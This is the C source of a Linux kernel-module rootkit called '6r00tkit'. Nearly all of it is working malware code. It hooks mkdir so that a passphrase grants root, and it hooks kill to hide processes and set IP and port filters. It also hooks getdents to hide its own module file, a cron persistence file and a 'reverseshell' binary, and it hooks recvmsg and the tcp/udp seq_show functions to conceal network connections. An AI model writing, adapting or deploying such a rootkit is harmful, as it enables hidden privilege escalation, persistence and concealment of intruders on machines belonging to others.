// This file implements a complete LKM rootkit

/*
    Copyright (C) 2023  Maurice Lambert
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#include <linux/fs.h>
#include <linux/tcp.h>
#include <linux/list.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/path.h>
#include <linux/sched.h>
#include <linux/ftrace.h>
#include <linux/string.h>
#include <linux/dirent.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/linkage.h>
#include <asm/processor.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/proc_ns.h>
#include <linux/fdtable.h>
#include <linux/compiler.h>
#include <linux/syscalls.h>
#include <linux/inet_diag.h>
#include <linux/moduleparam.h>

#pragma GCC optimize("-fno-optimize-sibling-calls")

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

MODULE_LICENSE("GPL");
MODULE_AUTHOR("MauriceLambert");
MODULE_DESCRIPTION("The 6r00tkit - Rootkit by MauriceLambert");
MODULE_VERSION("0.0.1");

/*
    Defines "command line" arguments for rootkit.
*/
static char *modulename = "groot";
module_param(modulename, charp, 0000);
MODULE_PARM_DESC(modulename, "Module name to hide");

static char *passphrase = "1 4m 6r00t";
module_param(passphrase, charp, 0000);
MODULE_PARM_DESC(passphrase, "Passphrase to get root permissions from mkdir");

static char *rootkitdirectory = "/root";
module_param(rootkitdirectory, charp, 0000);
MODULE_PARM_DESC(rootkitdirectory, "The rootkit directory (where kernel object and malware are stocked)");

static char *rootkitfile = "6r00tkit.ko";
module_param(rootkitfile, charp, 0000);
MODULE_PARM_DESC(rootkitfile, "The rootkit filename");

static char *persistencedirectory = "/etc/cron.d";
module_param(persistencedirectory, charp, 0000);
MODULE_PARM_DESC(persistencedirectory, "The persistence rootkit directory (where persistence file is stocked)");

static char *persistencefile = "6r00tkit";
module_param(persistencefile, charp, 0000);
MODULE_PARM_DESC(persistencefile, "The persistence filename");

static char *malwarefile = "reverseshell";
module_param(malwarefile, charp, 0000);
MODULE_PARM_DESC(malwarefile, "The malware filename");

static long int processsignal = 14600;
module_param(processsignal, long, 0000);
MODULE_PARM_DESC(processsignal, "Kill signal to hide process from kill");

static long int ipsignal = 0xdead;
module_param(ipsignal, long, 0000);
MODULE_PARM_DESC(ipsignal, "Kill signal to hide any connection from/to a specific IP address using kill to define the IP address");

static long int sourceportsignal = 666;
module_param(sourceportsignal, long, 0000);
MODULE_PARM_DESC(sourceportsignal, "Kill signal to hide tcp connection with specific source port from kill");

static long int destinationportsignal = 0xbeef;
module_param(destinationportsignal, long, 0000);
MODULE_PARM_DESC(destinationportsignal, "Kill signal to hide tcp connection with specific destination port from kill");

unsigned int ip_address = 0;
unsigned short source_port = 0;
unsigned short destination_port = 0;

/*
    Define structure not in kernel headers.
    https://elixir.bootlin.com/linux/v5.15.137/source/fs/readdir.c#L207
*/
struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[1];
};

/*
    Define structure to have necessary
    informations in symbol hooking.
*/
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/*
    Define the mkdir syscalls signatures.
*/
#ifdef PTREGS_SYSCALL_STUBS
typedef asmlinkage ssize_t (*recvmsg_signature)(const struct pt_regs *);
typedef asmlinkage long (*getdents64_signature)(const struct pt_regs *);
typedef asmlinkage int (*getdents_signature)(const struct pt_regs *);
typedef asmlinkage long (*mkdir_signature)(const struct pt_regs *);
typedef asmlinkage long (*kill_signature)(const struct pt_regs *);
#else
typedef asmlinkage long (*getdents64_signature)(unsigned int, struct linux_dirent64 *, unsigned int);
typedef asmlinkage ssize_t (*recvmsg_signature)(int, struct user_msghdr __user *, unsigned int);
typedef asmlinkage int (*getdents_signature)(unsigned int, struct linux_dirent *, unsigned int);
typedef asmlinkage long (*mkdir_signature)(const char __user *, umode_t);
typedef asmlinkage long (*kill_signature)(pid_t, int);
#endif

typedef asmlinkage long (*tcp_seq_show_signature)(struct seq_file *, void *);

tcp_seq_show_signature tcp4_seq_show_base;
tcp_seq_show_signature tcp6_seq_show_base;
tcp_seq_show_signature udp4_seq_show_base;
tcp_seq_show_signature udp6_seq_show_base;
getdents64_signature getdents64_base;
getdents_signature getdents_base;
recvmsg_signature recvmsg_base;
mkdir_signature mkdir_base;
kill_signature kill_base;

/*
    This function search a module by name.
*/
struct module *get_module_from_list(void) {
    struct list_head *pos;
    struct module *mod;

    list_for_each(pos, &THIS_MODULE->list) {
        mod = container_of(pos, struct module, list);

        if (strcmp(mod->name, modulename) == 0) {
            // printk(KERN_INFO "Module found: %s\n", mod->name);
            return mod;
        }
    }

    // printk(KERN_INFO "Don't find module: %s\n", mod->name);
    return NULL;
}

/*
    This function hides this rootkit and an other module
    defined by command line argument.
*/
void protect_and_hide(void) {
    struct module *module_to_hide = get_module_from_list();

    if (module_to_hide != NULL) {
        // printk(KERN_INFO "Protect module: %s\n", module_to_hide->name);
        try_module_get(module_to_hide);
        // printk(KERN_INFO "Hide module: %s\n", module_to_hide->name);
        list_del(&module_to_hide->list);
        kobject_del(&THIS_MODULE->mkobj.kobj);
    }

    // printk(KERN_INFO "Protect rootkit\n");
    try_module_get(THIS_MODULE);
    // printk(KERN_INFO "Hide rootkit\n");
    list_del(&THIS_MODULE->list);            // /proc/modules
    kobject_del(&THIS_MODULE->mkobj.kobj);   // /sys/module
}

/*
    This function changes the CR0 registry value
    used to defined kernel characteristics.
*/
inline void cr0_write(unsigned long cr0) {
    unsigned long __force_order;
    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

/*
    This function sets the write memory protection.
*/
void memprotect(unsigned int protect) {
    unsigned long cr0 = read_cr0();
    if (protect) {
        set_bit(16, &cr0);
    } else {
        clear_bit(16, &cr0);
    }
    cr0_write(cr0);
}

/*
    This function sets roots permissions.
*/
void set_root_permissions(void) {
    struct cred *credentials = prepare_creds();

    // printk(KERN_CRIT "test credentials\n");
    if (credentials == NULL) return;
    // printk(KERN_CRIT "set credentials\n");

    credentials->uid.val = credentials->gid.val = 0;
    credentials->euid.val = credentials->egid.val = 0;
    credentials->suid.val = credentials->sgid.val = 0;
    credentials->fsuid.val = credentials->fsgid.val = 0;

    // printk(KERN_CRIT "commit credentials\n");
    commit_creds(credentials);
}

/*
    This function hooks mkdir to get roots permissions
    when use a secret passphrase.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int mkdir_hook(const struct pt_regs *regs) {
    const char __user *pathname = (char *)regs->di;
#else
asmlinkage int mkdir_hook(const char __user *pathname, umode_t mode) {
#endif

    // printk(KERN_CRIT "mkdir hook: '%s' cmp '%s'\n", passphrase, pathname);
    if (!strcmp(passphrase, pathname)) {
        // printk(KERN_CRIT "mkdir hooking\n");
        set_root_permissions();
    } else {
#ifdef PTREGS_SYSCALL_STUBS
        return mkdir_base(regs);
#else
        return mkdir_base(pathname, mode);
#endif
    }

    return 0;
}

/*
    This function searchs process by PID.
*/
struct task_struct *search_process(pid_t pid) {
    struct task_struct *process = current;

    for_each_process(process)
    {
        if (process->pid == pid)
        {
            return process;
        }
    }
    return NULL;
}

/*
    This function sets an unused flags on a process to hide it.
*/
void set_hidden_flags(pid_t pid) {
    struct task_struct *process = search_process(pid);

    if (process == NULL) return;

    // printk(KERN_CRIT "Flags: %i\n", process->flags);
    process->flags ^= 0x10000000;
    // printk(KERN_CRIT "Flags: %i\n", process->flags);
}

/*
    This function hooks kill to get an hidden
    process when use a secret code.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage long kill_hook(const struct pt_regs *regs) {
    pid_t pid = regs->di;
    int signal = regs->si;
#else
asmlinkage long kill_hook(pid_t pid, int signal) {
#endif
    // printk(KERN_CRIT "kill with signal: %i\n", signal);
    if (signal == processsignal) {
        // printk(KERN_CRIT "kill hooking\n");
        set_hidden_flags(pid);
    } else if (signal == sourceportsignal) {
        source_port = htons((unsigned short)pid);
    } else if (signal == destinationportsignal) {
        destination_port = htons((unsigned short)pid);
    } else if (signal == ipsignal) {
        ip_address = htonl((unsigned int)pid);
    }
#ifdef PTREGS_SYSCALL_STUBS
    return kill_base(regs);
#else
    return kill_base(pid, signal);
#endif
}

/*
    This function checks for hidden flag on process by PID.
*/
unsigned long int has_hidden_flag(pid_t pid) {
    // printk(KERN_CRIT "Test PID: %i\n");
    if (!pid) return 0;
    struct task_struct *process = search_process(pid);
    // printk(KERN_CRIT "Get process: %p\n", process);
    if (process == NULL) return 0;
    // printk(KERN_CRIT "return: %i\n", process->flags & 0x10000000);
    return process->flags & 0x10000000;
}

/*
    This function gets full filename from file descriptor.
*/
char* get_filename_from_fd(int fd) {
    char *filename = NULL;

    struct file *file = fget(fd);
    if (file) {
        struct path path = file->f_path;
        filename = kmalloc(PATH_MAX, GFP_KERNEL);
        if (filename) {
            path_get(&path);
            strcpy(filename, d_path(&path, filename, PATH_MAX));
        }
        fput(file);
    }

    return filename;
}


/*
    This function hooks getdents64 to hide files and directories.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage long getdents64_hook(const struct pt_regs *regs) {
    int fd = regs->di;
    struct linux_dirent64 __user *directory = (struct linux_dirent64 *)regs->si;
    long int kernel_return = getdents64_base(regs);
#else
asmlinkage long getdents64_hook(unsigned int fd, struct linux_dirent64 *directory, unsigned int count) {
    long int kernel_return = getdents64_base(fd, directory, count);
#endif

    if (kernel_return <= 0) return kernel_return;
    char *directoryname = get_filename_from_fd(fd);
    if (
        current->files->fdt->fd[fd]->f_path.dentry->d_inode->i_ino != PROC_ROOT_INO &&
        strcmp(directoryname, rootkitdirectory) != 0 &&
        strcmp(directoryname, persistencedirectory) != 0
    ) return kernel_return;
    kfree(directoryname);

    struct linux_dirent64 *directory_kernel_return = kzalloc(kernel_return, GFP_KERNEL);
    if (directory_kernel_return == NULL) return kernel_return;

    if (copy_from_user(directory_kernel_return, directory, kernel_return)) {
        kfree(directory_kernel_return);
        return kernel_return;
    }

    struct linux_dirent64 *previous_directory;
    unsigned long offset = 0;

    while (offset < kernel_return) {
        struct linux_dirent64 *current_directory = (void *)directory_kernel_return + offset;

        if (
            has_hidden_flag(simple_strtoul(current_directory->d_name, NULL, 10)) ||
            strcmp(rootkitfile, current_directory->d_name) == 0 ||
            strcmp(persistencefile, current_directory->d_name) == 0 ||
            strcmp(malwarefile, current_directory->d_name) == 0
        ) {
            // printk(KERN_CRIT "getdents64 hooking (hidden process)\n");
            if (current_directory == directory_kernel_return) {
                // printk(KERN_CRIT "Hide first file or directory\n");
                kernel_return -= current_directory->d_reclen;
                memmove(current_directory, (void *)current_directory + current_directory->d_reclen, kernel_return);
            } else {
                // printk(KERN_CRIT "Hide file or directory\n");
                previous_directory->d_reclen += current_directory->d_reclen;
            }
        } else {
            previous_directory = current_directory;
        }

        offset += current_directory->d_reclen;
    }

    copy_to_user(directory, directory_kernel_return, kernel_return);
    kfree(directory_kernel_return);
    return kernel_return;
}

/*
    This function hooks getdents to files and hide directories.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int getdents_hook(const struct pt_regs *regs) {
    int fd = regs->di;
    struct linux_dirent __user *directory = (struct linux_dirent *)regs->si;
    int kernel_return = getdents_base(regs);
#else
asmlinkage int getdents_hook(unsigned int fd, struct linux_dirent *directory, unsigned int count) {
    int kernel_return = getdents_base(fd, directory, count);
#endif

    if (kernel_return <= 0) return kernel_return;
    char *directoryname = get_filename_from_fd(fd);
    if (
        current->files->fdt->fd[fd]->f_path.dentry->d_inode->i_ino != PROC_ROOT_INO &&
        strcmp(directoryname, rootkitdirectory) != 0 &&
        strcmp(directoryname, persistencedirectory) != 0
    ) return kernel_return;
    kfree(directoryname);

    struct linux_dirent *directory_kernel_return = kzalloc(kernel_return, GFP_KERNEL);
    if (directory_kernel_return == NULL) return kernel_return;

    if (copy_from_user(directory_kernel_return, directory, kernel_return)) {
        kfree(directory_kernel_return);
        return kernel_return;
    }

    struct linux_dirent *previous_directory;
    unsigned long offset = 0;

    while (offset < kernel_return) {
        struct linux_dirent *current_directory = (void *)directory_kernel_return + offset;

        if (
            has_hidden_flag(simple_strtoul(current_directory->d_name, NULL, 10)) ||
            strcmp(rootkitfile, current_directory->d_name) == 0 ||
            strcmp(persistencefile, current_directory->d_name) == 0 ||
            strcmp(malwarefile, current_directory->d_name) == 0
        ) {
            // printk(KERN_CRIT "getdents hooking (hidden process)\n");
            if (current_directory == directory_kernel_return) {
                // printk(KERN_CRIT "Hide first file or directory\n");
                kernel_return -= current_directory->d_reclen;
                memmove(current_directory, (void *)current_directory + current_directory->d_reclen, kernel_return);
            } else {
                // printk(KERN_CRIT "Hide file or directory\n");
                previous_directory->d_reclen += current_directory->d_reclen;
            }
        } else {
            previous_directory = current_directory;
        }

        offset += current_directory->d_reclen;
    }

    copy_to_user(directory, directory_kernel_return, kernel_return);
    kfree(directory_kernel_return);
    return kernel_return;
}

/*
    This function hooks recvmsg syscall to hide connections.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage ssize_t recvmsg_hook(const struct pt_regs *regs) {
    ssize_t size = recvmsg_base(regs);
    struct user_msghdr __user *message = (struct user_msghdr __user *) regs->si;
#else
asmlinkage ssize_t recvmsg_hook(int socketfd, struct user_msghdr __user *message, unsigned flags) {
    ssize_t size = recvmsg_base(socketfd, message, flags);
#endif
    if (size <= 0) return size;

    struct user_msghdr kernel_message;
    struct iovec kernel_iov;
    if (copy_from_user(&kernel_message, message, sizeof(*message))) return size;
    if (copy_from_user(&kernel_iov, kernel_message.msg_iov, sizeof(*kernel_message.msg_iov))) return size;
    void *buffer = kmalloc(size, GFP_KERNEL);
    if (buffer == NULL) return size;
    if (copy_from_user(buffer, kernel_iov.iov_base, size)) goto end;
    struct nlmsghdr *header = (struct nlmsghdr *)buffer;

    ssize_t size_base = size;
    ssize_t counter = size;
    while (header != NULL && NLMSG_OK(header, counter)) {
        if (header->nlmsg_type == NLMSG_DONE || header->nlmsg_type == NLMSG_ERROR) goto end;
        struct inet_diag_msg *connection = NLMSG_DATA(header);
        if ((connection->idiag_family == AF_INET || connection->idiag_family == AF_INET6) &&
            (source_port && connection->id.idiag_sport == source_port ||
                destination_port && connection->id.idiag_dport == destination_port ||
                (ip_address && connection->idiag_family == AF_INET &&
                    (ip_address == connection->id.idiag_src[0] || ip_address == connection->id.idiag_dst[0])))) {
            char *data = (char *)header;
            int offset = NLMSG_ALIGN(header->nlmsg_len);
            for (int index = 0; index < counter && index + offset < size_base; index += 1) data[index] = data[index + offset];
            size -= offset;
            counter -= offset;
        } else {
            header = NLMSG_NEXT(header, counter);
        }
    }

    if (copy_to_user(kernel_iov.iov_base, buffer, size_base)) goto end;
    if (copy_to_user(kernel_message.msg_iov, &kernel_iov, sizeof(kernel_message.msg_iov))) goto end;
    copy_to_user(message, &kernel_message, sizeof(*message));

end:
    kfree(buffer);
    return size;
}

/*
    This function hide TCP connection with
    specific port or IPv4 address.
*/
asmlinkage long tcp_seq_show_hook(struct seq_file *seq, void *s, tcp_seq_show_signature function) {
    // printk(KERN_CRIT "sport: %i %i, dport: %i %i, ip: %i %i\n", sport, source_port, dport, destination_port, ip, ip_address);

    if (s != SEQ_START_TOKEN) {
        struct sock *socket = (struct sock *)s;
        unsigned int s1_ip_address;
        unsigned int s2_ip_address;
        unsigned short s_source_port;
        unsigned short s_destination_port;
        int is_ipv4 = function == tcp4_seq_show_base || function == udp4_seq_show_base;
        // printk(KERN_CRIT "Not SEQ_START_TOKEN %i=%i %i=%i %li=%li %li=%li\n", sport, socket->inet_sport, dport, socket->inet_dport, ip, socket->inet_saddr, ip, socket->inet_daddr);

        if (socket->sk_state == TCP_TIME_WAIT) {
            // printk(KERN_CRIT "TCP_TIME_WAIT\n");
            struct inet_timewait_sock *inet = (struct inet_timewait_sock *)s;
            if (is_ipv4) {
                s1_ip_address = inet->tw_daddr;
                s2_ip_address = inet->tw_rcv_saddr;
            }
            s_source_port = inet->tw_sport;
            s_destination_port = inet->tw_dport;
        } else if (socket->sk_state == TCP_NEW_SYN_RECV) {
            // printk(KERN_CRIT "TCP_NEW_SYN_RECV\n");
            struct inet_request_sock *inet = (struct inet_request_sock *)s;
            if (is_ipv4) {
                s1_ip_address = inet->ir_rmt_addr;
                s2_ip_address = inet->ir_loc_addr;
            }
            s_source_port = inet->ir_num;
            s_destination_port = inet->ir_rmt_port;
        } else {
            // printk(KERN_CRIT "else %p\n", regs->ip);
            // struct inet_sock *inet = inet_sk(socket);
            // printk(KERN_CRIT "else %p\n", regs->ip);
            struct inet_sock *inet = (struct inet_sock *)socket;
            if (is_ipv4) {
                s1_ip_address = inet->inet_daddr;
                s2_ip_address = inet->inet_rcv_saddr;
            }
            s_destination_port = inet->inet_dport;
            s_source_port = inet->inet_sport;
        }

        if (
            (source_port && source_port == s_source_port) ||
            (destination_port && destination_port == s_destination_port) ||
            (is_ipv4 && ip_address &&
                (ip_address == s1_ip_address || ip_address == s2_ip_address)
            )
        ) {
            // printk(KERN_CRIT "connection hidden for specific TCP port or IP address\n");
            return 0;
        }
    }

    return function(seq, s);
}

/*
    This function hooks tcp4_seq_show_hook to hide TCP connections.
*/
asmlinkage long tcp4_seq_show_hook(struct seq_file *seq, void *s) {
    return tcp_seq_show_hook(seq, s, tcp4_seq_show_base);
}

/*
    This function hooks tcp6_seq_show_hook to hide TCP connections.
*/
asmlinkage long tcp6_seq_show_hook(struct seq_file *seq, void *s) {
    return tcp_seq_show_hook(seq, s, tcp6_seq_show_base);
}

/*
    This function hooks udp4_seq_show_hook to hide TCP connections.
*/
asmlinkage long udp4_seq_show_hook(struct seq_file *seq, void *s) {
    return tcp_seq_show_hook(seq, s, udp4_seq_show_base);
}

/*
    This function hooks udp6_seq_show_hook to hide TCP connections.
*/
asmlinkage long udp6_seq_show_hook(struct seq_file *seq, void *s) {
    return tcp_seq_show_hook(seq, s, udp6_seq_show_base);
}

/*
    This function returns kernel symbol
    (work with recent kernel versions).
*/
void *resolve_kernel_symbol(const char* symbol) {
    #ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    // printk(KERN_INFO "Register kallsyms_lookup_name\n");
    register_kprobe(&kp);
    // printk(KERN_INFO "Get kallsyms_lookup_name address\n");
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    // printk(KERN_INFO "Unregister kallsyms_lookup_name\n");
    unregister_kprobe(&kp);
#endif
    // printk(KERN_INFO "Get symbol address\n");
    return (void *)kallsyms_lookup_name(symbol);
}

/*
    This function hooks syscalls.
*/
void *syscall_hooking(unsigned long new_function, unsigned int syscall_number) {
    // printk(KERN_INFO "Get sys_call_table address\n");
    unsigned long *syscall_table = (unsigned long *)resolve_kernel_symbol("sys_call_table");
    if (!syscall_table) {
        printk(KERN_DEBUG "Error getting sys_call_table symbol\n");
        return NULL;
    }

    // printk(KERN_INFO "Get syscall address\n");
    void *base = (void *)syscall_table[syscall_number];

    // printk(KERN_INFO "Unprotect memory\n");
    memprotect(0);
    // printk(KERN_INFO "Set syscall\n");
    syscall_table[syscall_number] = (unsigned long)new_function;
    // printk(KERN_INFO "Protect memory\n");
    memprotect(1);

    return base;
}

/*
    Define hook structure for xxpX_seq_show symbols.
*/
struct ftrace_hook tcp4_seq_show_struct = {"tcp4_seq_show", tcp4_seq_show_hook, &tcp4_seq_show_base, 0, {}};
struct ftrace_hook tcp6_seq_show_struct = {"tcp6_seq_show", tcp6_seq_show_hook, &tcp6_seq_show_base, 0, {}};
struct ftrace_hook udp6_seq_show_struct = {"udp6_seq_show", udp6_seq_show_hook, &udp6_seq_show_base, 0, {}};
struct ftrace_hook udp4_seq_show_struct = {"udp4_seq_show", udp4_seq_show_hook, &udp4_seq_show_base, 0, {}};

/*
    This function changes RIP register to call hooked function.
*/
static void notrace function_hook(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *regs) {
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    // printk(KERN_CRIT "RIP: '%li' '%li' %li\n", ip, regs->regs.ip, (unsigned long) hook->function);
    if(!within_module(parent_ip, THIS_MODULE))
        regs->regs.ip = (unsigned long) hook->function;
    // printk(KERN_CRIT "RIP: '%li' '%li' %li\n", ip, regs->regs.ip, (unsigned long) hook->function);
}

/*
    This function hooks a kernel symbol.
*/
void *symbol_hooking(struct ftrace_hook *hook) {
    hook->address = (unsigned long)resolve_kernel_symbol(hook->name);
    if (hook->address == 0) {
        // printk(KERN_CRIT "Symbol '%s' not found\n", hook->name);
        return (void *)hook->address;
    }
    // printk(KERN_INFO "Original %p %p\n", hook->original, tcp4_seq_show_base);
    *((unsigned long*) hook->original) = hook->address;
    // printk(KERN_INFO "Original %p %p\n", hook->original, tcp4_seq_show_base);

    hook->ops.func = function_hook;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;

    int error = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (error) {
        printk(KERN_DEBUG "Error hooking '%s' symbol (ftrace_set_filter_ip)\n", hook->name);
        return (void *)hook->address;
    }

    error = register_ftrace_function(&hook->ops);
    if (error) {
        printk(KERN_DEBUG "Error hooking '%s' symbol (register_ftrace_function)\n", hook->name);
        return (void *)hook->address;
    }

    return (void *)hook->address;
}

/*
    This function unhooks a kernel symbol.
*/
void symbol_unhooking(struct ftrace_hook *hook) {
    if (unregister_ftrace_function(&hook->ops)) {
        printk(KERN_DEBUG "Error unhooking '%s' symbol (unregister_ftrace_function)\n", hook->name);
    }

    if (ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0)) {
        printk(KERN_DEBUG "Error unhooking '%s' symbol (ftrace_set_filter_ip)\n", hook->name);
    }
}

/*
    This function is launched on module load.
*/
static int __init grootkit_init(void) {
    // printk(KERN_INFO "Protect and hide\n");
    // protect_and_hide();
    // printk(KERN_INFO "mkdir syscall hooking\n");
    mkdir_base = syscall_hooking((unsigned long)mkdir_hook, (unsigned int)__NR_mkdir);
    // printk(KERN_INFO "kill syscall hooking\n");
    kill_base = syscall_hooking((unsigned long)kill_hook, (unsigned int)__NR_kill);
    // printk(KERN_INFO "getdents64 syscall hooking\n");
    getdents64_base = syscall_hooking((unsigned long)getdents64_hook, (unsigned int)__NR_getdents64);
    // printk(KERN_INFO "getdents syscall hooking\n");
    getdents_base = syscall_hooking((unsigned long)getdents_hook, (unsigned int)__NR_getdents);
    recvmsg_base = syscall_hooking((unsigned long)recvmsg_hook, (unsigned int)__NR_recvmsg);
    // printk(KERN_INFO "tcp4_seq_show syscall hooking %p\n", tcp4_seq_show_base);
    tcp4_seq_show_base = symbol_hooking(&tcp4_seq_show_struct);
    tcp6_seq_show_base = symbol_hooking(&tcp6_seq_show_struct);
    udp4_seq_show_base = symbol_hooking(&udp4_seq_show_struct);
    udp6_seq_show_base = symbol_hooking(&udp6_seq_show_struct);
    // printk(KERN_INFO "tcp4_seq_show symbol hooking %p\n", tcp4_seq_show_base);
    // printk(KERN_INFO "return\n");
    return 0;
}

/*
    This function is launched on module unload.
*/
static void __exit grootkit_exit(void) {
    syscall_hooking((unsigned long)mkdir_base, (unsigned int)__NR_mkdir);
    syscall_hooking((unsigned long)kill_base, (unsigned int)__NR_kill);
    syscall_hooking((unsigned long)getdents64_base, (unsigned int)__NR_getdents64);
    syscall_hooking((unsigned long)getdents_hook, (unsigned int)__NR_getdents);
    syscall_hooking((unsigned long)recvmsg_base, (unsigned int)__NR_recvmsg);
    symbol_unhooking(&tcp4_seq_show_struct);
    symbol_unhooking(&tcp6_seq_show_struct);
    symbol_unhooking(&udp6_seq_show_struct);
    symbol_unhooking(&udp4_seq_show_struct);
}

module_init(grootkit_init);
module_exit(grootkit_exit);